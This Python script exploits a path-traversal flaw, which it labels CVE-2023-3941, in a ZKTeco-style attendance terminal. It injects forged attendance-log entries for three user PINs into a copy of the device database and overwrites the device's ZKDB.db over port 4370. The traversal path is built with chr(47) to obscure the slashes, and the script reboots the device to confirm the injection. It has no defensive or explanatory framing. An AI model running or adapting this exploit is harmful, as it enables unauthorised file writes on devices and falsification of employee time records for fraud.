#!/usr/bin/env python3
"""FINAL ATTLOG injection using pyzk's proven upload mechanism."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os, shutil
from datetime import datetime
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
SOURCE_DB = 'D:\\chamcong\\zk_fw_attempts\\business_extracted\\000_ZKDB.db'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_filename, data):
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + target_filename
    filename = traversal.encode() + b'\x00'
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'): return {'error': 'PREPARE'}
    MAX_CHUNK = 0xFFc0  # 65472 - pyzk's TCP max
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'): return {'error': 'chunk'}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

# Inject
db = sqlite3.connect(SOURCE_DB)
cur = db.cursor()
test_time = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
for pin in ['1', '47', '1383']:
    cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                  VALUES (?, 1, ?, 0, 0, 0, 0, NULL, NULL, 0)''', (pin, test_time))
db.commit()
db.close()
with open(SOURCE_DB, 'rb') as f:
    modified = f.read()
print('[*] Modified ZKDB.db: {} bytes'.format(len(modified)))

# Connect
zk = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version())

try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE ATTLOG:', before_att)
except: before_att = None

try: conn.disable_device()
except: pass

print('\n[*] Uploading modified ZKDB.db via CVE-2023-3941...')
t0 = time.time()
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', modified)
print('  Upload result:', result)
print('  Upload time: {:.1f}s'.format(time.time() - t0))

print('\n[*] Rebooting...')
try: conn.restart()
except Exception as e: print('  Restart:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

print('\n[*] Waiting 20s for reboot...')
time.sleep(20)

print('\n[*] Reconnecting...')
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
    conn2 = zk2.connect()
    after_att = conn2.get_attendance_count()
    print('[*] AFTER ATTLOG:', after_att)
    if before_att is not None:
        print('  Delta: {:+d}'.format(after_att - before_att))
        if after_att == 49203:
            print('\n  [+] ATTLOG INJECTION CONFIRMED! Replaced DB with our data.')
        elif after_att > before_att:
            print('\n  [+] ATTLOG INJECTION WORKED PARTIALLY')
        else:
            print('\n  [?] No change - device may have rejected')
    conn2.disconnect()
except Exception as e:
    print('[!] Reconnect:', e)

print('\n[+] Done')
